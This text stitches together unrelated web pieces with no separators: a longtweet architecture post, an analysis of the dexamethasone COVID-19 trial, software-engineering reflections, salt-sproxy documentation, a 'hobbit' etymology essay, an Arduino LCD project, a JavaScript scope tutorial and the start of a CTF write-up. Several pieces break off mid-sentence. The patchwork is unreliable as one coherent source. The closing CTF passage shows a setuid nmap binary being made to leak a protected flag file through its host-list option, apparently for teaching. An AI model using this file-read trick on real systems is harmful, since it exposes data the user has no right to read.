<p>You can login and <a href="https://longtweet.io/">create a new post now</a>.</p>
<p>When you create a new post, it calls an AWS lambda function. In that function is where this service takes your content, pre-renders it to a static HTML file, and saves it to an S3 bucket.</p>
<p>From there, S3 and CloudFront handle the rest. The site is set up to be hosted from this S3 bucket so after the file gets dropped in, it's live.</p>
<h2>Performance</h2>
<p>It's excellent.</p>
<p>Viewing a post is highly optimized and virtually free. When any user from around the world views a page, it's readily available at network edges via CloudFront.</p>
<p>I maxed out what I could for free on <a href="https://k6.io/cloud">k6 cloud</a> and longtweet was able to handle sub 10 millisecond response times at 50 requests per second for 5 minutes — all while still on the free tier in AWS.</p>
<p><img src="https://longtweet.io/load-test-result.png" alt="Load test result"></p>
<h2>Taking performance further with minimalism</h2>
<p>For both performance and cost reasons, longtweet serves a very small bundle.</p>
<p>Longtweet posts are almost entirely static content with just a tiny bit of javascript used to show author controls.</p>
<p>The CSS and JS are inlined into the post's HTML making this beautiful network tab:</p>
<p><img src="https://longtweet.io/longtweet-network-tab.png" alt="longtweet network tab"></p>
<p>In 6.4kB in one request, the whole site is loaded (and we could push this minimalism further if we wanted to).</p>
<p>The minimalism makes a big difference for performance.</p>
<p><img src="https://longtweet.io/lighthouse-vs.jpg" alt="lighthouse scores. longtweet vs twitlonger"></p>
<p>Pictured left are the <a href="https://developers.google.com/web/tools/lighthouse">lighthouse</a> scores for longtweet and on the right are the lighthouse scores for TwitLonger (with ads).</p>
<p>The rest of the pages on longtweet are client-side rendered with <a href="https://preactjs.com/">preact</a>. The resulting bundle there is around 30kB.</p>
<h2>Drawbacks</h2>
<p>So at this point, you might be asking the big question: how do you change the pages after they've already been pre-rendered?</p>
<p>Well the simple answer is just render them all again.</p>
<p>Doing migrations of a site like this would require all of the users posts to be re-rendered. In order to make that possible, save the raw content to some DB explicitly for a migration.</p>
<hr>
<p>Longtweet is also open-source. <a href="https://github.com/ricokahler/longtweet.io">Check out the source code here.</a></p>
<p>Feel free to suggest ideas and contribute in any way. Transparency and simplicity are at the heart of this app. There are no plans on monetizing this.</p>

<div id="post-body-4318891213687925443">
<p>
In mid-June, <a href="https://www.recoverytrial.net/files/recovery_dexamethasone_statement_160620_v2final.pdf">a press release</a> brought some hope for treating patients with COVID-19: “Dexamethasone is the first drug to be shown to improve survival in COVID-19.” These findings came from the <a href="https://www.recoverytrial.net/">RECOVERY trial</a>, a large randomized clinical trial in the UK designed to evaluate four different treatments for hospitalized COVID-19 patients. The results made a big splash, both in the <a href="https://www.cnn.com/2020/06/16/health/dexamethasone-covid-drug-recovery-trial-bn/index.html">optimistic headlines</a> that followed, and the scientific community, where <a href="https://twitter.com/atul_gawande/status/1272880206408290304">some were miffed</a> that a press release was published before any data or journal paper. The full results have since been published as a preprint (which is to say, before full review by journals and scientific peers), so let’s dig in to better understand what the trial found.
</p>
<h3 id="the-setup">The setup</h3>


<p>
According to the <a href="https://www.medrxiv.org/content/10.1101/2020.06.22.20137273v1">preprint</a>, the dexamethasone (dex) arm of the trial enrolled 2,104 eligible COVID-19 patients across 176 National Health System hospitals in the UK between March and June. These 2,104 patients were randomly selected from among the ~11K participating in the larger RECOVERY trial, and they were generally well-matched with the 4,321 patients in the control arm in terms of disease severity and demographics. At the start of treatment, 16% of patients across both arms were on ventilators (or equivalent) and 60% were receiving oxygen only, leaving 24% with neither treatment. By the nature of the trial, all patients were hospitalized and COVID-19-positive, and thus we should not try to generalize the results to cases of COVID-19 that don’t require hospitalization. 
</p>
<p>
Because the trial was randomized without stratification (that is, patients were placed randomly without regard for matching age or other demographics across treatment groups), there were some minor differences between those assigned to the dex arm versus the control. Most notably, the dex patients were 1.1 years older than control patients on average. The researchers were able to adjust for age when running the analysis, though, and they did not find that this difference had any impact on the results.
</p>
<p>
One of the most important parts of planning a clinical trial is picking the right outcomes to measure and monitor. In some recent COVID-19 trials, such as <a href="https://www.nejm.org/doi/full/10.1056/NEJMoa2007764">for remdesivir</a>, the primary endpoint was “time to recovery.” In the RECOVERY trial (perhaps ironically given the name), the primary endpoint was 28-day mortality-- that is, how many patients had died after 28 days of treatment. The difference is subtle, but it does affect the way results are counted and assessed. For example, if a patient was still in the hospital after 28 days, this would be considered a successful treatment in the RECOVERY trial, but could be a failed treatment in the remdesivir trial. We might bicker about what the ideal endpoint is here, but, hopefully, these are at least directionally equivalent.
</p>
<h3 id="trial-results">Trial results</h3>


<p>
So, what happened with those 2,104 patients receiving dexamethasone treatment? Looking across all of them, there was a small but statistically significant reduction in deaths: 24.6% of control patients died within 28 days, but only 21.6% of dex-treated patients died within 28 days. 
</p>
<p>
“Errr,” you say, “that doesn’t seem to be much of a difference.” And it’s true; that difference doesn’t change the mental math of, “Will patient X die?” However, if we analyze the numbers according to the severity of symptoms, a clearer picture emerges. Among the 16% of patients on ventilators, 40.7% of control patients died within 28 days, but only 29% of dex-treated patients died within 28 days. To put those numbers another way: for COVID-19 patients requiring ventilators, treatment with dexamethasone increased survival by 35%. That’s big, and has the potential to save many lives, especially among the sickest of patients.
</p>
<p>
Patients requiring oxygen but not on ventilators likewise saw a decrease in mortality when treated with dex, though the difference looked very similar to the overall count: 25.0% of control patients on oxygen died within 28 days, but only 21.5% of dex-treated patients on oxygen died within 28 days. 
</p>
<p>
Now, if you’re doing the math, you should conclude that the patients receiving neither ventilator support nor oxygen actually did worse with dex treatment, and you wouldn’t be wrong: 13.2% of control patients without ventilators or oxygen died within 28 days, but 17.0% of dex-treated patients without ventilators or oxygen died within 28 days. Given the number of patients in this group (hundreds), this difference is not statistically significant, but it does strongly imply that giving dexamethasone to everyone or to mild COVID-19 patients is a bad idea, and could potentially cause more harm than good.

<p>
These results might at first seem paradoxical: how could dexamethasone help the most sick patients, but hurt those with more mild COVID-19 symptoms? The answer lies in the nature of dexamethasone, and the reason it was chosen as a possible treatment to begin with. Dex is a type of steroid called a corticosteroid, and it is a cheap and common pharmaceutical used for many illnesses requiring steroid treatment, including rheumatoid arthritis and croup.
</p>
<p>
The primary role of dex is to bind to glucocorticoid receptors, which are steroid receptors that exist on the surface of most cells across the body. Once a glucocorticoid receptor is bound, it triggers signaling pathways within the cell that turn off transcription of inflammatory genes and turn on transcription of anti-inflammatory genes. The net effect of dexamethasone, therefore, is as an anti-inflammatory hammer. Many different cells, especially within the immune system, turn down their alarms and stop anti-viral or anti-bacterial behavior. This is why dex is an effective treatment for illnesses like rheumatoid arthritis, where the primary cause is immune system overreaction, and this is also why dex is often used in laboratory settings to study anti-inflammatory transcription in macrophages and other cells.
</p>

What does that mean for COVID-19? Well, you’ll note that I’ve been talking about the disease condition (COVID) and not the actual virus (SARS-CoV-2), and that’s very intentional. Dex does not do anything (that we know of) to prevent the spread of the virus, or to help the body overcome the infection itself. On the contrary, we would expect Dex to quiet the immune system, and thus to make the body less able to fight off SARS-CoV-2. This may in fact be what the results in the more mild hospitalized patients show us-- that dex treatment too early or in mild cases may have a negative affect. (Though we should be careful here: the RECOVERY trial does not provide sufficient data to prove that hypothesis, and we would have to look to further studies to draw that conclusion.)
</p>
<p>
The beneficial effect of dexamethasone on more severe cases, researchers reason, is likely due to the fact that the acute respiratory failure many patients suffer from is not a direct result of the virus, but a result of immune overreaction in the lungs following viral infection. In their attempt to quell the infection in the lungs, cells of the innate and adaptive immune system create a hyper-inflammatory environment in lung tissues, and this in turn causes respiratory failure. Thus, patients on ventilators often show a loss of circulating immune cells (since many are localized to the lungs and other affected tissues) as well as high levels of inflammatory immune signaling molecules. In other words, for these patients, the threat of the virus has been superceded by the threat of an immune storm, and dex, in turning down immune and other cells, increases the chance of survival. 
</p>
<p>
So, we can say based on the RECOVERY trial that dexamethasone significantly improves the chance of survival for some of the most severe COVID-19 cases, but we should be careful to caveat that this does not make it an all-purpose treatment for COVID-19, and it certainly is not a vaccine or early treatment.

  <div><p>Right so yes I've spent over 25 years writing software for people in a professional capacity. As time has gone by, and I've learnt more about the process, I've slowly realised that actually writing code is actually quite a small part of the process. When I was a junior developer I probably spent 90% of my working day sat in front of an editor writing code. And I thought that was the job. Turns out it really isn't!Â&nbsp;</p></div><div><p>I think people both inside and outside of the industry fixate on coding for a number of reasons, and it's quite interesting to ruminate on those, but building software is so much more than writing code. Talking to users, agreeing on features, designing the interface, setting up the infrastructure, testing the platform for bugs, testing it for performance, providing support for it. These are all messy, imprecise things that have very human factors.Â&nbsp;</p></div><div><p>If you are a software engineer you can often seek solace in the code itself. Code is truth. You can't really argue with it. You can't argue with your compiler. It's really easy to fall into the trap of avoiding all work other than coding for these very reasons. But I would suggest that this makes you a really bad engineer! Engineering means getting your hands dirty, either literally in the case of Brunel, or from a human interaction point of view where software is concerned.</p></div>

Is that correct?</p></div><div><p>How much of this comes down to the attitude of the engineer? And how much of this comes down to actively studying?Â&nbsp;</p></div>

  <div><p>In my experience, almost 100% of that learning comes from hard won experience.Â&nbsp;</p></div><div><p>When I studied at university, I was really surprised to discover that the "Computing" courses that I was interested in were labelled as "Software Engineering". I thought it was odd at the time; I never really had thought it about it before, and I was even a bit worried that I might have been signing up for the wrong course!Â&nbsp;</p></div><div><p>I don't think many universities at the time offered "Computer Science" as an undergrad course; it's a very different discipline.Â&nbsp;</p></div><div><p>It took me a LONG time to get my head around the fact that one of the words in the job was "engineering". And really the only way I realised that was after years of working building software. At some point the penny dropped that I was an engineer, and that writing code was only 1 aspect of that job.Â&nbsp;</p></div>

  <div><p>There are a number of things that people starting off in a career of Software Engineering should try and keep in mind.</p></div><div><div><ol>
<li>Never stop learning. Software development is still a very immature discipline. I like to think about it like building jet aeroplanes. After the jet engine was invented, flying on a jet passenger plane was pretty dangerous! Google "the de Havilland Comet". There was so much new engineering that needed to be learnt to get to the point where now it is pretty much the safest mode of transport in the world. The software industry is still building de Havilland Comets to a certain degree. So much is being learnt in terms of best practices, what works and what doesn't. If you don't constantly learn new things, you will be left behind.</li>
<li>You know less than you think. You can wield great power writing software and it can go to your head! Good engineers are humble and never think they either know it all or know better than others.</li>
<li>Stretch yourself. If you know an OOP language, learn a functional one like Elixir or Haskell. If you have spent a lot of time with a very high level language like Python, try Rust. Think of it like a gym. The machine you cant stand the site of is probably the one doing you the most good.</li>
<li>It is an art as well as a science. There is room for beauty and elegance in software.</li>

<p><span>New in version 2020.7.0.</span></p>
<p>Using <em>salt-sproxy</em>, besides regular Minions, regular Proxy Minions, and
standalone Proxy Minions (managed by <em>salt-sproxy</em> itself), you can also manage
arbitrary machines via SSH, in the same way as you’d normally do through
<a href="https://docs.saltstack.com/en/latest/topics/ssh/">salt-ssh</a>. In fact, this
is actually done through the <a href="https://salt-sproxy.readthedocs.io/en/latest/proxy/ssh.html#ssh-proxy"><span>SSH Proxy Module</span></a> shipped together with this
package, which in turn invokes <em>salt-ssh</em> internals. While <em>salt-ssh</em> has
been part of the Salt suite for years, it has always been decoupled from the
rest. One of the evident implications is that you manage some devices by
running <code><span>salt</span></code>, and others by running <code><span>salt-ssh</span></code>. <em>salt-sproxy</em> aims to
abstract that away, and provide a single, uniform methodology for managing
whatever flavours of Salt you want, through the same command and offering the
same features.</p>
<p>In essence, using the <a href="https://salt-sproxy.readthedocs.io/en/latest/proxy/ssh.html#ssh-proxy"><span>SSH Proxy Module</span></a>, <em>salt-sproxy</em> spins up a temporary
Proxy Minion locally, which means you can use it to manage arbitrary machines
over SSH, and you can continue using the usual <a href="https://salt-sproxy.readthedocs.io/en/latest/targeting.html#targeting"><span>Targeting</span></a> mechanisms, or
execute Salt commands over the REST API (see also <a href="https://salt-sproxy.readthedocs.io/en/latest/salt_sapi.html#salt-sapi"><span>salt-sapi</span></a>).</p>
<div>
<p>Important</p>
<p>As this feature depends on two external modules, provides with
<em>salt-sproxy</em>, you will need to make sure your installation is aware of
those. You ave multiple options here:</p>
<ul>
<li>Execute passing the <code><span>--sync-proxy</span></code> and <code><span>--sync-executors</span></code> on the
command line.</li>
<li>Set <code><span>sync_proxy:</span> <span>true</span></code> and <code><span>sync_executors:</span> <span>true</span></code> in the Master
config file.</li>
<li>Configure the <code><span>file_roots</span></code> on the Master, as detailed in <a href="https://salt-sproxy.readthedocs.io/en/latest/runner.html#runner"><span>The Proxy Runner</span></a>,
then execute <code><span>salt-run</span> <span>saltutil.sync_all</span></code> (or
<code><span>saltutil.sync_proxymodules</span></code> + <code><span>saltutil.sync_executors</span></code>, if you only
want the SSH code, ignorning anything else). See also

</ul>
</div>
<div id="pillar">

<p>The entry for ‘hobbit’ in the <cite>Oxford English Dictionary</cite> has an unhelpful etymology:

</p><blockquote><p><strong>hobbit, <em>n.</em></strong> In the tales of J. R. R. Tolkien (1892–1973): one of an imaginary people, a small variety of the human race, that gave themselves this name (meaning ‘hole-dweller’) but were called by others <em>halflings</em>, since they were half the height of normal men.<a href="#note-1" id="noteref-1"><sup>1</sup></a></p></blockquote>

<p>This alleged derivation of ‘hobbit’ from ‘hole-dweller’ can’t be the correct explanation for the origin of the word, as Tolkien created this derivation in the early 1950s as part of the ‘fiction of translation’ of <cite>The Lord of the Rings</cite>, in which Westron, the common speech of the western part of Middle Earth, is imagined to have been translated into modern English, and Rohirric into Old English. Appendix F of <cite>The Return of the King</cite> says:

</p><blockquote><p><em>Hobbit</em> is an invention. In the Westron the word used, when this people was referred to at all, was <em>banakil</em> ‘halfing’. But at this date the folk of the Shire and of Bree used the word <em>kuduk</em>, which was not found elsewhere. Meriadoc, however, actually records that the King of Rohan used the word <em>kûd-dûkun</em> ‘hole-dweller’. Since, as has been noted, the Hobbits had once spoken a language closely related to that of the Rohirrim, it seems likely that <em>kuduk</em> was a worn-down form of <em>kûd-dûkun</em>. The latter I have translated, for reasons explained, by <em>holbytla</em>; and <em>hobbit</em> provides a word that might well be a worn-down form of <em>holbytla</em>, if that name had occurred in our own ancient language [that is, Old English, in which it would have meant ‘hole-builder’].</p></blockquote>

<p>But none of this can have been on Tolkien’s mind when he began work on <cite>The Hobbit</cite>: at that point, even the idea of linking it to the world of <cite>The Silmarillion</cite> had not occurred to him, let alone the Second and Third Ages, the evolution of Rohirric and Westron from Numenorean, and the fiction of translation. For a more plausible account, we have to turn instead to Tolkien’s 1955 letter to W. H. Auden, in which he wrote:

</p><blockquote><p>All I remember about the start of <cite>The Hobbit</cite> is sitting correcting School Certificate papers in the everlasting weariness of that annual task forced on impecunious academics with children. On a blank leaf I scrawled: ‘In a hole in the ground there lived a hobbit.’ I did not and do not know why. I did nothing about it, for a long time, and for some years I got no further than the production of Thror’s Map. But it became <cite>The Hobbit</cite> in the early 1930s<a href="#note-2" id="noteref-2"><sup>2</sup></a></p></blockquote>

<p>Tolkien’s biographer Humphrey Carpenter quoted another version of the story but (following his usual slipshod practice) without reference:

</p><blockquote><p>It was on a summer’s day, and he was sitting by the window in the study at Northmoor Road [in Oxford], laboriously marking School Certificate exam papers. Years later he recalled: ‘One of the candidates had mercifully left one of the pages with no writing on it (which is the best thing that can possibly happen to an examiner) and I wrote on it: “<em>In a hole in the ground there lived a hobbit</em>”. Names always generate a story in my mind. Eventually I thought I’d better find out what hobbits were like. But that’s only the beginning.’<a href="#note-3" id="noteref-3"><sup>3</sup></a></p></blockquote>

<p>This must have been fairly soon after Tolkien took up his post as Professor of Anglo-Saxon at Pembroke College, Oxford, in 1925.

</p><p>✴

</p><p>However, there is a complication to this tidy story. In <cite>The Denham Tracts: A Collection of Folklore by Michael Aislabie Denham</cite> (1895) we find:

</p><blockquote><p>[…] pigmies, chittifaces, nixies, Jinny-burnt-tails, dudmen, hell-hounds, dopple-gangers, boggleboes, bogies, redmen, portunes, grants, <strong>hobbits</strong>, hobgoblins, brown-men, cowies, dunnies, wirrikows, alholdes, mannikins, follets, korreds, lubberkins, cluricauns, kobolds, leprechauns, kors, mares, korreds, puckles, korigans, sylvans, succubuses, black-men, shadows, banshees, lian-hanshees, clabbernappers, Gabriel-hounds, mawkins, doubles, corpse lights or candles, scrats, mahounds, trows, gnomes, sprites, fates, fiends, sybils, nick-nevins, whitewomen, fairies, thrummy-caps […]<a href="#note-4" id="noteref-4"><sup>4</sup></a></p></blockquote>

<p>How are we to reconcile Tolkien’s version of events with the appearance of the word in a list of supernatural beings in a 19th century work on folklore? There seem to be two possibilities: either Tolkien had in fact read the word in Denham (or some other source yet undiscovered) but had forgotten that he had done so; or the two occurrences of the word are independent inventions. The problem with the first of these possibilities is that Denham’s tracts are obscure. In <cite>The Ring of Words: Tolkien and the Oxford English Dictionary</cite>, Gilliver et al. describe his work thus:

</p><blockquote><p>Denham was an amateur folklorist who published many books and pamphlets, including twenty <cite>Minor Tracts on Folklore</cite> (1849–c. 1854). The majority of these Tracts were collected in an edition prepared for the Folklore Society in the 1890s, and the word <em>hobbit</em> appears in the second volume (1895) of this edition.<a href="#note-5" id="noteref-5"><sup>5</sup></a></p></blockquote>

<p>In the absence of any evidence that Tolkien read Denham’s work, Gilliver et al. have to resort to speculation about how he might have done so:

</p><blockquote><p>The 1895 version would have been readily available in university libraries accessible to Tolkien (there is a copy in Oxford), and he was interested in folklore. Alternatively, he could have seen a list copied out by one of his friends or colleagues.<a href="#note-6" id="noteref-6"><sup>6</sup></a></p></blockquote>

<p>But this is hard to believe. By 1925 the Bodleian Library had well over a million books, and there is no reason to suspect Tolkien of having found this particular needle in that vast haystack.

</p><p>✴

</p><p>There is the tantalizing possibility of another source for the word. A letter to <cite>The Observer</cite> a few months after the publication of <cite>The Hobbit</cite> in 1937, asked about the origins of the name:

</p><blockquote><p>Sir,—Dr. Julian Huxley, in one of his recent lectures, referred to the “little furry men” seen in Africa by natives and, although dimly in moonlight, by at least one scientist.

</p><p>What I should like to know is whether these creatures provided the inspiration for Professor Tolkien’s attractive hobbit, the newest visitor to so many of our nurseries this Christmas. Naturally, I always read my children’s book before giving them to them, and I noticed that all the characters in the hobbit were nearly all drawn from real animal life or from real mythology. Few of them appeared to be invented.

</p><p>On mentioning the hairy-footed hobbit, rather like a rabbit, to one of my contemporaries, I was amazed to see her shudder. <strong>She said she remembered an old fairy tale called “The Hobbit” in a collection read about 1904.</strong> This creature, she said, was definitely frightening, unlike Professor Tolkien’s. Would the Professor be persuaded to tell us some more about the name and inception of the intriguing hero of his book? It would save so many research students so very much trouble in the generations to come. And, by the way, is the hobbit's stealing of the dragon's cup based on the cup-stealing episode in Beowulf? I hope so, since one of the book's charms appears to be its Spenserian harmonising of the brilliant threads of so many branches of epic, mythology, and Victorian fairy literature. Yours, etc. ‘Habit’<a href="#note-7" id="noteref-7"><sup>7</sup></a></p></blockquote>

<p>Tolkien replied, denying any knowledge of the “old fairy tale”:

</p><blockquote><p>I was born in Africa, and have read several books on African exploration. I have, since about 1896, read even more books of fairy-tales of the genuine kind. Both the facts produced by the Habit would appear, therefore, to be significant.

</p><p>But are they? I have no waking recollection of furry pigmies (in book or moonlight); nor of any Hobbit bogey in print by 1904. I suspect that the two hobbits are accidental homophones, and am content* that they are not (it would seem) synonyms.

</p><p>* Not quite. I should like, if possible, to learn more about the fairy-tale collection, c. 1904.<a href="#note-8" id="noteref-8"><sup>8</sup></a></p></blockquote>

<p>The “old fairy tale” has not turned up in 80 years of searching, and so it seems that ‘Habit’s friend was mistaken in her recollection, perhaps at the distance of 34 years having confused ‘The Hobbit’ with a similar-sounding title. An example of a tale that could fit the bill is ‘<a href="https://books.google.co.uk/books?id=PQVLAAAAYAAJ&amp;pg=RA1-PA295">The Bar-gaist, or Boggart</a>’ which was printed in John Roby’s <cite>Traditions of Lancashire</cite> (1829).

</p><p>So I think it is more likely that Denham’s and Tolkien’s ‘hobbit’ are independent inventions. There is a word ‘hob’ (an abbreviation of ‘Robin’) from which they could both derive:

</p><blockquote><p><strong>hob, <em>n.1</em> 2.a.</strong> = Robin Goodfellow or Puck; a hobgoblin, sprite, elf.<a href="#note-9" id="noteref-9"><sup>9</sup></a></p></blockquote>

<p>This gave rise to the compounds ‘hobgoblin’ (an imp or sprite; a terrifying apparition), ‘hobhouchin’ (an owl), and ‘hob-thrush’ (a goblin), so it could also have assisted with the coining of ‘hobbit’.

</p>

<p>Character LCDs have been around for a long time. These displays contain a number of discinct blocks—each capable of displaying a single character—so displaying
scrolling text would traditionally involve just shifting characters left one block at a time.
That’s fine and all, but why not take advantage of free time during quarantine to raise the bar.. 😉</p>
<h3 id="hardware">Hardware</h3>
<p>Most character displays utilise the <a href="https://en.wikipedia.org/wiki/Hitachi_HD44780_LCD_controller">Hitachi HD44780 controller chip</a>,
which has the neat feature of letting us define and use up to eight custom characters, each 5x8 pixels in size.
Mine uses this chip, so I’ll be taking advantage of repeatedly rendering custom characters to pull off smooth scrolling text.</p>
<p>I connected an Arduino Leonardo to my <a href="https://joeraut.com/posts/interfacing-salvaged-lcd-display/">salvaged display</a> over its 4-bit interface, and got to work on the software side.</p>
<figure>
    <img src="https://joeraut.com/images/posts/smooth-scrolling-text-on-character-lcds/arduino-connection.jpg"> <figcaption>
            <h4>Arduino connected to character LCD</h4>
        </figcaption>
</figure>

<h3 id="software">Software</h3>
<p>As we use an Arduino, the software written is in C++. Source code available at the end of the article.</p>
<p>We allocate memory for a canvas that will contain the raw pixel data for the message we want to display. We make use of a
<a href="https://github.com/Ameba8195/Arduino/blob/master/hardware_v2/cores/arduino/font5x7.h">5x7-pixel ASCII font</a>, and for each ASCII character
in the message string, we place the corresponding character at the appropriate location on the canvas using the <code>memcpy</code> function.</p>
<p>In order to display our canvas on the LCD, we define a function to generate display-ready custom characters by grabbing pixel data from appropriate locations on
the canvas. For each frame of the scrolling process, we can simply increment the horizontal index of the location on the canvas by one, which results
in the message on-screen scrolling left by one pixel. These custom characters are then pushed to the display, and presto—smooth-scrolling text!</p>
<p>There was a slight complication I glossed over—the memory structure of custom characters differs to that of the font and canvas. The font and canvas use five
bytes to represent each character, with each byte representing one 7-pixel column (the most significant bit is ignored). The custom character format,
however, uses 8 bytes—each representing one row of the character. To solve this issue, we define a function <code>transpose</code> which takes care of mapping
the canvas format to the custom character format.</p>
<h3 id="source-code">Source code</h3>
<p>The Arduino sketch is available here: <a href="https://joeraut.com/files/posts/smooth-scrolling-text-on-character-lcds/SmoothScrollingText.ino">SmoothScrollingText.ino</a>.</p>
<p>It should run on most Arduino devices, but I have only tested it on an Arduino Leonardo. Be sure to modify the LCD pin setup for your hardware.</p>

<p>Thank you for showing all the love to the series so far, really appreciate your feedback, likes and constructive criticisms. Hope you find this one useful as well.</p>

<p>What will be the output of the following code execution and why?</p>
<pre><code><span><span>function</span> <span>jerry</span>(<span></span>) </span>{
  <span>console</span>.log(name);
}

<span><span>function</span> <span>tom</span>(<span></span>) </span>{
  <span>var</span> name = <span>'tom'</span>;
  jerry();
}

<span>var</span> name = <span>'cartoon'</span>;

tom();
</code></pre>
<p>Is it going to be, <code>cartoon</code>, <code>tom</code> or <code>undefined</code>? But more importantly, how are you deciding on an answer here? Are you going by the <code>Scope</code>? What about the <code>execution context</code>?</p>

<p>The answer of the question I have asked above is, <code>cartoon</code>. Let us explore and understand it further.</p>
<blockquote>
<p>In JavaScript, Scope is the mechanism to determine the accessibility of variables throughout its existence. It could be inside or outside of a function call.</p>
</blockquote>
<p>Let us break the above code into pieces and see how the variable's accessibility changes depending on where the variable has been declared and the functions are created.</p>
<h2 id="recap">Recap</h2>
<p>Here are some of the key points from our Understanding of  <a target="_blank" rel="noopener noreferrer" href="https://blog.greenroots.info/understanding-javascript-execution-context-like-never-before-ckb8x246k00f56hs1nefzpysq">JavaScript Execution Context</a>:</p>
<ul>
<li>There is something called, Global Execution Context and Function Execution Context.</li>
<li>Each execution context has a special thing called,  <a target="_blank" rel="noopener noreferrer" href="https://blog.greenroots.info/javascript-this-is-easy-and-what-do-you-need-to-know-about-it-ckca1pqqr00gmmns13n921wib">this</a> and the reference to the <code>Outer Environment</code>.</li>
<li>When we invoke a function, the JavaScript engine creates an outer reference for the current Function Execution Context.</li>
<li>The function has access to the variables defined in the Outer reference and JavaScript engine does a look-up when it is unable to find it in the current execution context.</li>
</ul>
<h2 id="scope-and-scope-chain">Scope and Scope chain</h2>
<p>In the example above, there are two function invocations, tom() and jerry(). Hence there will be two different function execution contexts created. </p>
<p>Remember, there is always a global execution context created where the keyword <code>this</code> is equal to the <code>Window</code> object. Hence we have total three execution contexts here, one Global Execution Context and two function Execution Contexts of <code>tom()</code> and <code>jerry()</code> respectively.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1594980950188/bRYSlkg2l.png?auto=format&amp;q=60" alt="functions.png"></p>
<ul>
<li>The variable <code>name</code> was created in the global execution context and assigned a value as <code>cartoon</code> in the execution phase.<pre><code><span>var</span> name = <span>'cartoon'</span>;
</code></pre>
</li>
<li>When the function <code>tom()</code> was invoked, JavaScript engine created an execution context for <code>tom()</code> and a reference to the outer environment which is the global execution context.<pre><code>tom();
</code></pre>
</li>
<li>When tom() invokes <code>jerry()</code>, JavaScript engine identifies the <code>lexical</code> position of jerry() and does the same. It creates an execution context of jerry() and a reference to the outer environment.<pre><code><span><span>function</span> <span>tom</span>(<span></span>) </span>{
 <span>var</span> name = <span>'tom'</span>;
 jerry();
}
</code></pre>
</li>
</ul>
<p>Hold on. What's the outer environment of <code>jerry()</code>? Is it the execution context of <code>tom()</code> or the global execution context? This depends on the answer of another question. </p>
<blockquote>
<p>Who created <code>jerry()</code>? Where is it sitting lexically?</p>
</blockquote>
<p><code>jerry()</code> is created by the global execution context even though it was invoked in <code>tom()</code>'s execution context. We find that, <code>jerry()</code> sitting lexically at the global execution context and created by it. As we go by this theory, <code>jerry()</code> is having a pointer to the global execution context.</p>
<p>So far so good? What we also find is, <code>jerry()</code> doesn't have a variable declared called, <code>name</code> in it. In the execution phase, it tries to to log the <code>name</code> variable. </p>
<pre><code><span><span>function</span> <span>jerry</span>(<span></span>) </span>{
  <span>console</span>.log(name);
}
</code></pre>
<p>In execution phase, JavaScript engine starts the look-up process following the outer reference of <code>jerry()</code> and find a variable <code>name</code> created with a value, <code>cartoon</code> in the global execution context. </p>
<p>Now we know, why the answer of the question has to be <code>cartoon</code>, not <code>tom</code> or <code>undefined</code>. Here is the visual flow of how the scoping took place,</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1594988178340/uQSdlosQO.gif?auto=format,compress&amp;gif-q=60" alt="flow_1.gif"></p>
<p>The whole process of looking up for the variable in the current execution context and outer references form a chain called, the <code>Scope Chain</code>. We can also conclude that, the variable <code>name</code> is in the scope of the function <code>jerry()</code> because it was successfully found in its scope chain.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1594983372127/nSxdUOgCv.png?auto=format&amp;q=60" alt="scope_chain.png"></p>

<p>Quiz time again! What will be the output of this code execution?</p>
<pre><code><span><span>function</span> <span>tom</span>(<span></span>) </span>{
  <span>var</span> name = <span>'tom'</span>;
  <span><span>function</span> <span>jerry</span>(<span></span>) </span>{
    <span>console</span>.log(name);
  }
  jerry();
}

<span>var</span> name = <span>'cartoon'</span>;

tom();
</code></pre>
<p>We have made a small change in the above code. Now the function <code>jerry()</code> is created inside <code>tom()</code>. The reference to outer environment from <code>jerry()</code>'s execution context will be pointing to <code>tom()</code>'s execution context. Hence the variable <code>name</code> will be found in the scope chain as defined in tom() function. So you know the answer is, <code>tom</code>!</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1594983940937/P6kWnWGbk.gif?auto=format,compress&amp;gif-q=60" alt="flow_2.gif"></p>

<p>As we got the fundamentals of scope, let us understand what block scope is. A code block is defined by these braces <code>{...}</code>. If a variable is declared within a code block using a keyword called, <code>let</code>, it’s only visible inside that block.</p>
<pre><code>{
  <span>let</span> name = <span>"tom"</span>; 

  <span>console</span>.log(name); 
}

<span>console</span>.log(name); 
</code></pre>
<p>Had we created the variable <code>name</code> with <code>var</code> instead of <code>let</code>, we wouldn't have found this block scope restriction. Here is another example,</p>
<pre><code>{
  
  <span>let</span> name= <span>"tom"</span>;
  <span>console</span>.log(name);
}

{
  
  <span>let</span> name = <span>"jerry"</span>;
  <span>console</span>.log(name);
}
</code></pre>
<p>This is going to work perfectly fine and logs tom and jerry in the console.</p>
<p>Even for <code>if</code>, <code>for</code>, <code>while</code> etc, variables declared inside the block(<code>{...}</code>) are only visible inside it. Here is an example with <code>for</code> loop,</p>
<pre><code><span>for</span> (<span>let</span> counter = <span>0</span>; counter &lt; <span>10</span>; counter++) {
  
  
  <span>console</span>.log(counter); 
}

<span>console</span>.log(counter); 
</code></pre>

<p>Understanding scope with the fundamental concepts like, execution context, outer reference, lexical positioning etc, will help in debugging the complex bugs(those horrible production ones) with ease. We as JavaScript developers will be more confident about how things work internally.</p>

July 17, 2020 | https://www.elttam.com/blog/lua-suid-shells/ | <a href="https://web.archive.org/web/*/https://www.elttam.com/blog/lua-suid-shells/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        <p>Recently, elttam released a series of <a href="https://www.libctf.so/">CTF challenges</a> that were created for <a href="https://www.bsidesau.com.au/">BSides Canberra</a> and <a href="https://www.brucon.org/">Brucon</a> a few years back. <a href="https://twitter.com/justinsteven">Justin Steven</a> has been uploading a <a href="https://www.youtube.com/channel/UCCBmFvsR6sIPrmjSVVxY9ng">YouTube</a> series containing solutions to some of these challenges. One of the challenges that was solved was a challenge called hideandseek. The challenge had a flag that was only accessible to the hideandseek user and required the user to find the suid nmap binary belonging to the hideandseek user. Justin quickly solved the hideandseek challenge using the intended solution of passing in flag.txt as a file containing list of hosts to scan and leaking it in an error message:</p>

<div><div><pre><code>hahn@ubuntu1604:/challenges/hideandseek$ nmap -iL flag.txt

Starting Nmap 7.01 ( https://nmap.org ) at 2020-06-19 05:04 UTC
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

WARNING: No targets were specified, so 0 hosts scanned.
